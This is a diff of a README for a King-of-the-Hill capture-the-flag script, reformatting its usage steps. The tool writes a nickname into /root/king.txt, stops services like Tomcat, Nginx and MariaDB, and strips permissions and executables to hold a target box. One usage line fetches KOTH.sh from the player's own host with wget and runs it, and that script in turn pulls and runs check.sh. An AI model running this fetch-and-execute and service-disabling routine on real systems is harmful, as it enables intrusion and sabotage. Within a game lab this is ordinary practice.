@@ -9,7 +9,7 @@ The KOTH Script is a powerful tool created by H3X-007 to ensure that you are the
 
 ## Features
 
-- Sets the user nickname as the KING in the \`/root/king.txt\` file.
+- Sets the user nickname as the KING in the `/root/king.txt` file.
 - Applies necessary patches to enhance security.
 - Stops critical services like Tomcat, Nginx, and MariaDB.
 - Restricts file permissions and removes certain executables.
@@ -17,21 +17,25 @@ The KOTH Script is a powerful tool created by H3X-007 to ensure that you are the
 
 ## Usage
 
-1. Step 1
+1. Clone the repository:
     
        git clone https://github.com/H3X-007/KOTH-Scripts.git
 
-2. Step 2
+2. Change to the KOTH-Scripts directory:
        
-       cd KOTH-Script && python3 -m http.server 80
+       cd KOTH-Script 
 
-3. In KOTH Machine.
+3. Start a Python HTTP server on port 80:
+  
+       python3 -m http.server 80  
+
+4. On the KOTH machine, execute the KOTH.sh script:
   
        wget http://YOUR-VPN-IP/KOTH.sh && chmod +x KOTH.sh && ./KOTH.sh
 
-4. Enter your desired nickname when prompted.
+5. Enter your desired nickname when prompted.
 
-5. Sit back and enjoy being the KING! The script will continuously update the KING nickname in the \`/root/king.txt\` file to maintain your dominance.
+6. Sit back and enjoy being the KING! The script will continuously update the KING nickname in the \`/root/king.txt\` file to maintain your dominance.
 
 #### NOTE : Please ensure that the Python server is running on port 80 before executing the KOTH script. The KOTH script relies on the server to retrieve and run the check.sh script. Once the check.sh script is obtained and executed, you can safely close the Python server.
 
